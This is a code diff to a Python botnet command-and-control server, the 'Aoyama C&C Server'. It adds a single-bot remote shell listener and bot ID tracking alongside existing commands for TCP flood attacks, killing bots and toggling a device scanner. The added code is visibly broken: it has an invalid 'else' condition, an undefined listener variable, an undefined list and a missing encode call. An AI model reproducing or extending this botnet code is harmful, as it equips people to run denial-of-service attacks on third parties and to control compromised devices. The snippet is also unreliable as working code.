@@ -24,6 +24,7 @@ import os
 import time
 import sys
 import base64 as b64
+import random
 shutdown= False
 key= "asdfghjkloiuytresxcvbnmliuytf"#xor key
 
@@ -32,7 +33,6 @@ if len(sys.argv)<=1:
 	sys.exit()
 
 b = int(sys.argv[1])
-
 socketList = []
 def sent_command(count,dead,data,sock):
 	try:
@@ -100,6 +100,8 @@ def showbot():#bot count
 			return
 
 def handle_bot(sock,socketList):
+	code = len(socketList) + 1
+	id_list.append(str(code))
 	while True:
 		try:
 			sock.settimeout(1)
@@ -137,6 +139,8 @@ def waitConnect(sock,addr):
 					socketList.append(sock)
 					print("[!] A bot Online "+ str(addr)) #message
 					handle_bot(sock,socketList)
+			else passwd == "\r\n":
+				Commander(sock)
 		except:
 			#removed Login code, more easy for skid
 			#If u are using putty pls use raw mode to connect,
@@ -146,14 +150,34 @@ def waitConnect(sock,addr):
 			Commander(sock)
 	except:
 		sock.close()
+def shell_exec():
+	s = socket.socket()
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
+	while 1:
+		try:
+			s.bind(('0.0.0.0',420))
+			break
+		except:
+			continue
+	s.listen(1)
+	while 1:
+		s, addr = lis.accept()
+		tmp = s.recv(1024).decode()
+		
+	##shell
 
 def Commander(sock):#cnc server
 	global so
 	so = sock
-	sock.send("Username:".encode())
-	name = sock.recv(1024).decode()
-	sock.send("Password:".encode())
-	passwd = sock.recv(1024).decode()
+	try:
+		sock.send("Username:".encode())
+		name = sock.recv(1024).decode()
+		sock.send("Password:".encode())
+		passwd = sock.recv(1024).decode()
+	except:
+		print("// Someone try to break the server down in progress //")
+		return
 	tmp = open("login.txt").readlines()#enter ur username and password in login.txt
 	corret=0
 	for x in tmp:
@@ -204,8 +228,7 @@ def Commander(sock):#cnc server
 	sock.send(("[!] Welcom to the Aoyama C&C Server, "+str(name.strip("\r\n"))+"\r\n").encode())
 	sock.send("==============================================\r\n".encode())
 	time.sleep(1)
-	botn = threading.Thread(target=showbot,daemon=True)
-	botn.start()
+	threading.Thread(target=showbot,daemon=True).start()
 
 
 	while True:
@@ -218,6 +241,8 @@ def Commander(sock):#cnc server
 				#sock.send(str(count)+"bots exec the command\r\n".encode())
 			if cmd_str == 'scan' or cmd_str == 'scan\r\n':
 				scan_device()
+			if cmd_str == 'shell' or cmd_str == 'shell\r\n':
+				shell_exec()
 			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
 				sock.send('\r\n#-- Commands --#\r\n'.encode())
 				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
@@ -227,6 +252,7 @@ def Commander(sock):#cnc server
 				sock.send('    !stop    : stop attack\r\n'.encode())
 				sock.send('    !kill    : kill all the bots\r\n'.encode())
 				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
+				sock.send('    shell    : send command to single bot')
 				sock.send('    bots     : count bot\r\n'.encode())
 				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
 				sock.send('    clear    : Clear screen\r\n'.encode())
